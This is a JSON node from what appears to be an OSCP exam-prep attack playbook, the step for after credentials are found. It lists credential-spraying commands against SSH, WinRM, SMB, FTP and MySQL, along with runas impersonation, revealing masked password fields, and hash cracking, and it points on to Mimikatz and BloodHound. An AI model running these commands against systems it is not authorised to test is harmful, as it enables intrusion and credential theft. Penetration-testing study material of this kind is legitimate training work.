{
  "id": "creds_found",
  "phase": "CREDS",
  "title": "Credentials Found",
  "body": "Spray those creds on every service immediately. Password reuse is the most consistent win on OSCP. Same user, same password, different service.",
  "cmd": "# Try everything\nssh user@$ip\nevil-winrm -i $ip -u user -p 'password'\nnxc smb $ip -u user -p 'password'\nnxc winrm $ip -u user -p 'password'\nsmbclient //$ip/share -U user\nftp $ip   # try creds manually\nmysql -u user -p'password' -h $ip\n\n# Check all share access with creds\nnxc smb $ip -u user -p 'password' --shares\nnxc smb $ip -u user -p 'password' --users\nnxc smb $ip -u user -p 'password' --groups\n\n# ── RUNAS — open PS as another user (Windows, requires GUI) ──\n# Basic runas — opens cmd window as target user\nrunas /user:HOSTNAME\targetuser cmd\n\n# Open PowerShell as target user\nrunas /user:HOSTNAME\targetuser powershell\n\n# With saved credentials (if cmdkey has them stored)\nrunas /savecred /user:HOSTNAME\targetuser powershell\n\n# Domain user\nrunas /user:DOMAIN\targetuser powershell\n\n# No GUI? Use PowerShell credential object instead:\n# (works in bind shell / WinRM)\n# pw = ConvertTo-SecureString \"FOUND_PASSWORD\" -AsPlainText -Force\n# cred = New-Object PSCredential(\"HOSTNAME/targetuser\", pw)\n# Start-Process powershell -Credential cred\n\n# Then in the new window — verify you are the new user:\nwhoami\nwhoami /groups\nwhoami /priv\n\n# Re-enumerate as new user — permissions change!\n# Run full enum again — files readable by dave may not be\n# readable by steve and vice versa (Module 17.1.3 pattern)\n\n# ══════════════════════════════════════════════════\n# REVEAL A MASKED PASSWORD FIELD (any admin panel)\n# ══════════════════════════════════════════════════\n# When an app's settings page shows a password as ••••••• but you can't\n# read it, the value is often still in the HTML — just masked by CSS.\n# Reveal it: F12 DevTools → inspect the password <input> →\n# change  type=\"password\"  to  type=\"text\"  → value shows in plaintext.\n# Works on: mail/SMTP settings, DB connection configs, service creds,\n# saved-login fields. Then try that password for su/ssh/other services.\n# (Won win on Fired: Openfire SMTP field → root password.)\n\n# ── BASE64 / ENCODED PASSWORDS ────────────────────\n# Some apps store passwords as base64 not hashes — check before cracking:\necho '<base64string>' | base64 -d   # ends with == ? likely base64\n# MD5 = 32 hex chars, no padding. base64 = alphanumeric+/+= with == at end\nhashcat -m 0 <md5hash> /usr/share/wordlists/rockyou.txt",
  "warn": null,
  "choices": [
    {
      "label": "FIRST — try these creds for a direct login everywhere",
      "next": "use_creds_first"
    },
    {
      "label": "SSH / shell access — Linux machine",
      "next": "linux_post_exploit"
    },
    {
      "label": "WinRM / RDP / SMB — Windows machine",
      "next": "windows_post_exploit"
    },
    {
      "label": "Web access only",
      "next": "file_upload"
    },
    {
      "label": "Need to extract more creds — Mimikatz",
      "next": "mimikatz"
    },
    {
      "label": "AD creds — move laterally (triage by group)",
      "next": "ad_lateral_setup"
    },
    {
      "label": "Domain creds confirmed — run BloodHound for attack paths",
      "next": "bloodhound"
    },
    {
      "label": "Spray these creds everywhere NOW",
      "next": "cred_reuse"
    }
  ]
}
